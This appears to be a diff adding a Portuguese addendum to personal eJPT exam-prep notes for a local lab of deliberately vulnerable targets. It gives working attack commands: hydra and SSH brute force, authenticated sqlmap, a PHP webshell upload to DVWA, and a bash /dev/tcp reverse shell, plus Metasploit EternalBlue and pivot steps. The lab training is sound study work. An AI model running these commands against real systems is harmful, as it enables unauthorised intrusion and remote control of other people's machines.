@@ -596,4 +596,81 @@ Antes de mandar qualquer comando pro Lorran no exame: **1) o alvo responde? 2) a
 existe nesta máquina? 3) a saída é coerente?** Se a saída for "boa demais" (senha achada na
 primeira tentativa de http-get, banco inteiro sem esforço), desconfiar — hydra e sqlmap mentem.
 
+---
+
+# ADENDO 23/OUT — O LAB DE HOJE (IPs e portas reais, medidos 18:00–18:10)
+
+Os cenários acima continuam válidos. O que muda é **onde praticar** e **o que cada alvo ensina**.
+
+## Mapa do lab (6 alvos no ar)
+| Cenário | Alvo real | Comando de entrada |
+|---|---|---|
+| A — SMB/445 | `172.28.77.11` (SRVLEGACY, Samba SMB1) | `nmap -Pn -p445 --script smb-os-discovery,smb-enum-shares,smb-security-mode IP` |
+| A — SMB/445 moderno | `172.28.77.12` (SMB2/3) | `nmap -Pn -p445 -sV IP` + `smb_login` |
+| B — FTP/21 | `127.0.0.1:2121` (vsftpd 3.0.2) | `hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t4 -f ftp://127.0.0.1:2121` |
+| C — Web | `localhost:8080` DVWA · `localhost:3000` Juice | `gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/common.txt` |
+| C — SQLi autenticada | DVWA `security=low` | `web_login.py` → cookie → `sqlmap --cookie` |
+| D — SSH/22 | `127.0.0.1:2222` | `ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -w msfadmin` |
+| E — Pivot | rede `libertus-labnet` (172.28.77.0/24) | precisa de foothold primeiro — ver Cenário E |
+
+## A (445) — o que o lab ensina e o que ele NÃO ensina
+Rodado hoje: guest READ/WRITE em `publico`; `financeiro` e `rh` só com credencial.
+`smb_ms17_010` respondeu **"Host does NOT appear vulnerable"** — correto, porque é Samba.
+- **Ensinar no lab:** enumeração de shares, creds fracas, `smb_login`, montagem do share.
+- **Não ensina:** EternalBlue real. Para treinar o exploit, precisa Windows (HTB / Metasploitable3).
+- No exame, se o 445 for Windows: confirmar com `smb_ms17_010` e só então `ms17_010_eternalblue`.
+
+## B (21) — hydra de verdade, com prova
+```bash
+hydra -l msfadmin -P ~/wordlists/pass/top10k.txt -t 4 -f ftp://IP:21
+ftp IP        # confirmar na mão com as credenciais achadas
+```
+Hoje: acertou em ~1 s no lab. **FTP é o módulo do hydra que funciona nesta máquina** (SSH/RDP não).
+
+## C (Web) — números de hoje
+- `gobuster` common.txt → `/config/`, `/docs/`, `/external/`, `/login.php`, `/robots.txt`, `/php.ini`, `.gitignore`.
+- `sqlmap` autenticado → 4 técnicas, bancos `dvwa` e `information_schema`.
+- Juice Shop: sqlmap desiste; UNION manual no `/rest/products/search` funciona.
+
+### C → upload de webshell → RCE → reverse shell (VALIDADO hoje, ponta a ponta)
+Sequência exata, com o que funcionou de verdade (não é teoria):
+```bash
+# 1) sessão (o DVWA 1.10 desta imagem NÃO usa CSRF na página de upload)
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/web_login.py -u http://IP/login.php -l admin -p password
+# -> COOKIE: PHPSESSID=...; security=low
+
+# 2) webshell
+printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+curl -s -b "PHPSESSID=SEU; security=low" \
+  -F "uploaded=@/tmp/shell.php;type=image/jpeg" -F "Upload=Upload" \
+  http://IP/vulnerabilities/upload/
+
+# 3) prova de execução
+curl -s "http://IP/hackable/uploads/shell.php?c=id"
+# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# 4) reverse shell (URL-encode o comando!)
+#    bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+nc -lvnp 4444            # no seu Kali, ANTES de disparar
+```
+Resultado real de hoje: conexão recebida do container, shell `www-data`, `id`/`hostname`/`pwd` respondendo.
+Detalhe que custa tempo: o botão do form é **`Upload` com U maiúsculo**; e o caminho final do arquivo é
+sempre `/hackable/uploads/<nome>`. Se der 404, o upload não gravou — cheque a mensagem na resposta.
+
+
+## D (SSH) — comando exato validado hoje
+```bash
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -w msfadmin
+# [+] SUCESSO: msfadmin:msfadmin  (0,1 s)
+ssh -p 2222 msfadmin@127.0.0.1     # confirmar shell
+```
+
+## E (Pivot) — status honesto
+Não testei pivot ponta a ponta hoje porque **não há sessão/foothold aberta** no lab. A cadeia
+(`get_local_subnets` → `run autoroute -s REDE/24` → `use auxiliary/server/socks_proxy` →
+`proxychains nmap -Pn -sT -p- IP`) continua sendo a correta e está detalhada no Cenário E acima.
+Treinar isso exige primeiro comprometer o `172.28.77.11` e usar ele como ponte para o `.12` —
+é o exercício recomendado para a próxima sessão de treino.
+
+
 
